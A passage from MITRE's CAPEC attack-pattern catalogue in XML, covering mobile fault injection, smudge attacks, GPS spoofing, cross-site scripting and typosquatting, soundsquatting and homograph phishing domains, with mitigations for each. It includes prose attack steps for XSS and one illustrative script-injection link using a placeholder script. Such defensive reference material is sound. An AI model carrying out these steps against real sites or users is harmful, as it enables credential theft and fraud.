            <Mitigation>Implement robust physical security countermeasures and monitoring.</Mitigation>
         </Mitigations>
         <Notes>
            <Note Type="Other">Considerable effort on the part of the adversary is often required in order to detect and analyze fault/side channel data.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Alternate_Terms, Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Other_Notes, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-08-04</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="625" Name="Mobile Device Fault Injection" Abstraction="Detailed" Status="Draft">
         <Description>Fault injection attacks against mobile devices use disruptive signals or events (e.g. electromagnetic pulses, laser pulses, clock glitches, etc.) to cause faulty behavior. When performed in a controlled manner on devices performing cryptographic operations, this faulty behavior can be exploited to derive secret key information. Although this attack usually requires physical control of the mobile device, it is non-destructive, and the device can be used after the attack without any indication that secret keys were compromised.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="624"/>
         </Related_Attack_Patterns>
         <Skills_Required>
            <Skill Level="High">Adversaries require non-trivial technical skills to create and implement fault injection attacks on mobile devices. Although this style of attack has become easier (commercial equipment and training classes are available to perform these attacks), they usual require significant setup and experimentation time during which physical access to the device is required. This prerequisite makes the attack challenging to perform (assuming that physical security countermeasures and monitoring are in place).</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Access Control</Scope>
               <Impact>Read Data</Impact>
               <Note>Extract long-term secret keys (e.g. keys used for VPN or WiFi authentication and encryption) to enable decryption of intercepted VOIP traffic.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Strong physical security of all devices that contain secret key information. (even when devices are not in use)</Mitigation>
            <Mitigation>Frequent changes to secret keys and certificates.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="626" Name="Smudge Attack" Abstraction="Detailed" Status="Draft">
         <Description>Attacks that reveal the password/passcode pattern on a touchscreen device by detecting oil smudges left behind by the user’s fingers.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="167"/>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The attacker must have physical access to the device.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Medium">The attacker must know how to make use of these smudges.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Strong physical security of the device.</Mitigation>
         </Mitigations>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="627" Name="Counterfeit GPS Signals" Abstraction="Standard" Status="Draft">
         <Description>An adversary attempts to deceive a GPS receiver by broadcasting counterfeit GPS signals, structured to resemble a set of normal GPS signals. These spoofed signals may be structured in such a way as to cause the receiver to estimate its position to be somewhere other than where it actually is, or to be located where it is but at a different time, as determined by the adversary.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="148">
               <Exclude_Related Exclude_ID="513"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must be relying on valid GPS signal to perform critical operations.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">The ability to spoof GPS signals is not trival.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to create spoofed GPS signals.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
         </Consequences>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="628" Name="Carry-Off GPS Attack" Abstraction="Detailed" Status="Draft">
         <Description>A common form of a GPS spoofing attack, commonly termed a carry-off attack begins with an adversary broadcasting signals synchronized with the genuine signals observed by the target receiver. The power of the counterfeit signals is then gradually increased and drawn away from the genuine signals. Over time, the adversary can carry the target away from their intended destination and toward a location chosen by the adversary.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="627">
               <Exclude_Related Exclude_ID="513"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Prerequisites>
            <Prerequisite>The target must be relying on valid GPS signal to perform critical operations.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="High">This attack requires advanced knoweldge in GPS technology.</Skill>
         </Skills_Required>
         <Example_Instances>
            <Example>A "proof-of-concept" attack was successfully performed in June, 2013, when the luxury yacht "White Rose" was misdirected with spoofed GPS signals from Monaco to the island of Rhodes by a group of aerospace engineering students from the Cockrell School of Engineering at the University of Texas in Austin. The students were aboard the yacht, allowing their spoofing equipment to gradually overpower the signal strengths of the actual GPS constellation satellites, altering the course of the yacht.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-489" Section="GPS Spooking"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Typical_Likelihood_of_Exploit, Typical_Severity</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="629" Name="Unauthorized Use of Device Resources" Abstraction="Detailed" Status="Draft">
         <Description>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</Description>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="114"/>
         </Related_Attack_Patterns>
         <Skills_Required>
            <Skill Level="High">Knowledge of the affected system, including what devices are connected to it, as well as knowledge of how to extract information from these devices.</Skill>
         </Skills_Required>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Motivation-Consequences, Attacker_Skills_or_Knowledge_Required, Description Summary</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="63" Name="Cross-Site Scripting (XSS)" Abstraction="Standard" Status="Draft">
         <Description>An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.</Description>
         <Likelihood_Of_Attack>High</Likelihood_Of_Attack>
         <Typical_Severity>Very High</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="242"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. He records all the links, the forms, the resources accessed and all other potential entry-points for the web application.</Description>
               <Technique>Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.</Technique>
               <Technique>Use a proxy tool to record all links visited during a manual traversal of the web application.</Technique>
               <Technique>Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.</Description>
               <Technique>Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.</Technique>
               <Technique>Use a proxy tool to record results of manual input of XSS probes in known URLs.</Technique>
               <Technique>Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.</Technique>
               <Technique>Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>4</Step>
               <Phase>Exploit</Phase>
               <Description>[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site</Technique>
               <Technique>Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>5</Step>
               <Phase>Exploit</Phase>
               <Description>[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.</Description>
               <Technique>Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines.</Skill>
            <Skill Level="High">Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.</Skill>
         </Skills_Required>
         <Resources_Required>
            <Resource>Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.</Resource>
         </Resources_Required>
         <Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Commands</Impact>
               <Note>Run Arbitrary Code</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Data</Impact>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Data</Impact>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Design: Use browser technologies that do not allow client side scripting.</Mitigation>
            <Mitigation>Design: Utilize strict type, character, and encoding enforcement</Mitigation>
            <Mitigation>Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.</Mitigation>
            <Mitigation>Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.</Mitigation>
            <Mitigation>Implementation: Perform input validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Perform output validation for all remote content.</Mitigation>
            <Mitigation>Implementation: Session tokens for specific host</Mitigation>
            <Mitigation>Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>Classic phishing attacks lure users to click on content that appears trustworthy, such as logos, and links that seem to go to their trusted financial institutions and online auction sites. But instead the attacker appends malicious scripts into the otherwise innocent appearing resources. The HTML source for a standard phishing attack looks like this:</xhtml:p>
               <xhtml:div style="margin-left:10px;" class="attack">&lt;a href="www.exampletrustedsite.com?Name=&lt;script&gt;maliciousscript&lt;/script&gt;"&gt;Trusted Site&lt;/a&gt;</xhtml:div>
               <xhtml:p>When the user clicks the link, the appended script also executes on the local user's machine.</xhtml:p>
            </Example>
         </Example_Instances>
         <Related_Weaknesses>
            <Related_Weakness CWE_ID="79"/>
            <Related_Weakness CWE_ID="20"/>
         </Related_Weaknesses>
         <References>
            <Reference External_Reference_ID="REF-1"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2014-06-23</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2017-05-01</Modification_Date>
               <Modification_Comment>Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit</Modification_Comment>
            </Modification>
            <Previous_Entry_Name Date="2017-05-01">Simple Script Injection</Previous_Entry_Name>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="630" Name="TypoSquatting" Abstraction="Detailed" Status="Draft">
         <Description>An adversary registers a domain name with at least one character different than a trusted domain. A TypoSquatting attack takes advantage of instances where a user mistypes a URL (e.g. www.goggle.com) or not does visually verify a URL before clicking on it (e.g. phishing attack). As a result, the user is directed to an adversary-controlled destination. TypoSquatting does not require an attack against the trusted domain or complicated reverse engineering.</Description>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.</Description>
               <Technique>Research popular or high traffic websites.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the TypoSquatted URL.</Description>
               <Technique>Register the TypoSquatted domain.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the TypoSquatted domain.</Description>
               <Technique>Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.</Technique>
               <Technique>Assume that a user will incorrectly type the legitimate URL, leading the user to the TypoSquatted domain.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries must be able to register DNS hostnames/URL’s.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the intention of the adversary, a successful TypoSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticate all servers and perform redundant checks when using DNS hostnames.</Mitigation>
            <Mitigation>Purchase potential TypoSquatted domains and forward to legitimate domain.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An adversary sends an email, impersonating paypal.com, to a user stating that they have just received a money transfer and to click the given link to obtain their money.</xhtml:p>
               <xhtml:p>However, the link the in email is paypa1.com instead of paypal.com, which the user clicks without fully reading the link.</xhtml:p>
               <xhtml:p>The user is directed to the adversary's website, which appears as if it is the legitimate paypal.com login page.</xhtml:p>
               <xhtml:p>The user thinks they are logging into their account, but have actually just given their paypal credentials to the adversary. The adversary can now use the user's legitimate paypal credentials to log into the user's account and steal any money which may be in the account.</xhtml:p>
               <xhtml:p>TypoSquatting vulnerability allows an adversary to impersonate a trusted domain and trick a user into visiting the malicious website to steal user credentials.</xhtml:p>
            </Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-491"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="631" Name="SoundSquatting" Abstraction="Detailed" Status="Draft">
         <Description>An adversary registers a domain name that sounds the same as a trusted domain, but has a different spelling. A SoundSquatting attack takes advantage of a user's confusion of the two words to direct Internet traffic to adversary-controlled destinations. SoundSquatting does not require an attack against the trusted domain or complicated reverse engineering.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Homophone Attack</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted, receives a consistent amount of traffic, and is a homophone.</Description>
               <Technique>Research popular or high traffic websites which are also homophones.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the SoundSquatted URL.</Description>
               <Technique>Register the SoundSquatted domain.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the SoundSquatted domain.</Description>
               <Technique>Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the SoundSquatted domain.</Technique>
               <Technique>Assume that a user will unintentionally use the homophone in the URL, leading the user to the SoundSquatted domain.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries must be able to register DNS hostnames/URL’s.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the intention of the adversary, a successful SoundSquatting attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticate all servers and perform redundant checks when using DNS hostnames.</Mitigation>
            <Mitigation>Purchase potential SoundSquatted domains and forward to legitimate domain.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An adversary sends an email, impersonating the popular banking website guaranteebanking.com, to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.</xhtml:p>
               <xhtml:p>However, the link the in email is guarantybanking.com instead of guaranteebanking.com, which the user clicks without fully reading the link.</xhtml:p>
               <xhtml:p>The user is directed to the adversary's website, which appears as if it is the legitimate guaranteebanking.com login page.</xhtml:p>
               <xhtml:p>The user thinks they are logging into their account, but have actually just given their guaranteebanking.com credentials to the adversary. The adversary can now use the user's legitimate guaranteebanking.com credentials to log into the user's account and steal any money which may be in the account.</xhtml:p>See also: SoundSquatting vulnerability allows an adversary to impersonate a trusted domain and leverages a user's confusion between the meaning of two words which are pronounced the same into visiting the malicious website to steal user credentials.</Example>
         </Example_Instances>
         <References>
            <Reference External_Reference_ID="REF-491"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2019-04-04</Modification_Date>
               <Modification_Comment>Updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
         </Content_History>
      </Attack_Pattern>
      <Attack_Pattern ID="632" Name="Homograph Attack via Homoglyphs" Abstraction="Detailed" Status="Draft">
         <Description>An adversary registers a domain name containing a homoglyph, leading the registered domain to appear the same as a trusted domain. A homograph attack leverages the fact that different characters among various character sets look the same to the user. Homograph attacks must generally be combined with other attacks, such as phishing attacks, in order to direct Internet traffic to the adversary-controlled destinations.</Description>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Homoglyph Attack</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Likelihood_Of_Attack>Low</Likelihood_Of_Attack>
         <Typical_Severity>Medium</Typical_Severity>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern Nature="ChildOf" CAPEC_ID="616">
               <Exclude_Related Exclude_ID="512"/>
               <Exclude_Related Exclude_ID="513"/>
               <Exclude_Related Exclude_ID="515"/>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="543"/>
            <Related_Attack_Pattern Nature="CanPrecede" CAPEC_ID="89"/>
            <Related_Attack_Pattern Nature="CanFollow" CAPEC_ID="98"/>
         </Related_Attack_Patterns>
         <Execution_Flow>
            <Attack_Step>
               <Step>1</Step>
               <Phase>Explore</Phase>
               <Description>[Determine target website] The adversary first determines which website to impersonate, generally one that is trusted and receives a consistent amount of traffic.</Description>
               <Technique>Research popular or high traffic websites.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>2</Step>
               <Phase>Experiment</Phase>
               <Description>[Impersonate trusted domain] In order to impersonate the trusted domain, the adversary needs to register the URL containing the homoglpyh character(s).</Description>
               <Technique>Register the Homograph domain.</Technique>
            </Attack_Step>
            <Attack_Step>
               <Step>3</Step>
               <Phase>Exploit</Phase>
               <Description>[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the Homograph domain.</Description>
               <Technique>Execute a phishing attack and send a user an e-mail convincing the to click on a link leading the user to the malicious domain.</Technique>
            </Attack_Step>
         </Execution_Flow>
         <Prerequisites>
            <Prerequisite>An adversary requires knowledge of popular or high traffic domains, that could be used to deceive potential targets.</Prerequisite>
         </Prerequisites>
         <Skills_Required>
            <Skill Level="Low">Adversaries must be able to register DNS hostnames/URL’s.</Skill>
         </Skills_Required>
         <Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Other</Impact>
               <Note>Depending on the intention of the adversary, a successful Homograph attack can be leveraged to execute more complex attacks such as cross-site scripting or stealing account credentials.</Note>
            </Consequence>
         </Consequences>
         <Mitigations>
            <Mitigation>Authenticate all servers and perform redundant checks when using DNS hostnames.</Mitigation>
            <Mitigation>Utilize browsers that can warn users if URLs contain characters from different character sets.</Mitigation>
         </Mitigations>
         <Example_Instances>
            <Example>
               <xhtml:p>An adversary sends an email, impersonating bankofamerica.com to a user stating that they have just received a new deposit and to click the given link to confirm the deposit.</xhtml:p>
               <xhtml:p>However, the link the in email is bankofamerica.com, where the 'a' and 'e' characters are Cyrillic and not ASCII, instead of bankofamerica.com (all ASCII), which the user clicks after carefully reading the URL, making sure that typosquatting and soundsquatting attacks are not being leveraged against them.</xhtml:p>
               <xhtml:p>The user is directed to the adversary's website, which appears as if it is the legitimate bankofamerica.com login page.</xhtml:p>
               <xhtml:p>The user thinks they are logging into their account, but have actually just given their bankofamerica.com credentials to the adversary. The adversary can now use the user's legitimate bankofamerica.com credentials to log into the user's account and steal any money which may be in the account.</xhtml:p>
               <xhtml:p>Homograph vulnerability allows an adversary to impersonate a trusted domain by leveraging homoglyphs and tricking a user into visiting the malicious website to steal user credentials.</xhtml:p>See also: CVE-2012-0584 CVE-2009-0652 CVE-2005-0233 CVE-2005-0234 CVE-2005-0235 CVE-2005-0236 CVE-2005-0237 CVE-2005-0238</Example>
         </Example_Instances>
         <Content_History>
            <Submission>
               <Submission_Name>CAPEC Content Team</Submission_Name>
               <Submission_Organization>The MITRE Corporation</Submission_Organization>
               <Submission_Date>2015-11-09</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
               <Modification_Organization>The MITRE Corporation</Modification_Organization>
               <Modification_Date>2018-07-31</Modification_Date>
               <Modification_Comment>Updated Attack_Phases</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CAPEC Content Team</Modification_Name>
